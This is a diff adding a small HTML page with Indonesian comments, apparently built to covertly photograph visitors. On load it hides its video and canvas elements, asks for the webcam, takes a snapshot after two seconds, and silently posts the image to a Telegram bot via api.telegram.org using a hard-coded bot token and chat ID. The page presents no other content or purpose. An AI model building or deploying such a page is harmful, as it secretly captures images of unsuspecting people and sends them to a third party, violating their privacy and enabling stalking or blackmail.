@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+    <style>
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // Ambil elemen video dan canvas
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Token bot Telegram dan chat ID
+        const botToken = '8032664775:AAGYUma4KEhBj_HyKtHZOD9tBYOkj_YAgOI'; // Ganti dengan token bot Telegram kamu
+        const chatId = '1896304247'; // Ganti dengan chat ID tujuan
+
+        // Akses kamera
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.play();
+                setTimeout(capturePhoto, 2000); // Ambil foto setelah 2 detik
+            } catch (err) {
+                console.error("Error akses kamera: ", err);
+            }
+        }
+
+        // Ambil foto dari video
+        function capturePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0);
+            const dataURL = canvas.toDataURL('image/png');
+            sendPhotoToTelegram(dataURL);
+        }
+
+        // Kirim foto ke bot Telegram
+        function sendPhotoToTelegram(photoData) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', dataURLtoBlob(photoData), 'photo.png');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Foto terkirim: ', result);
+            })
+            .catch(error => {
+                console.error('Error kirim foto: ', error);
+            });
+        }
+
+        // Konversi data URL ke Blob
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+
+        // Mulai kamera saat halaman dimuat
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
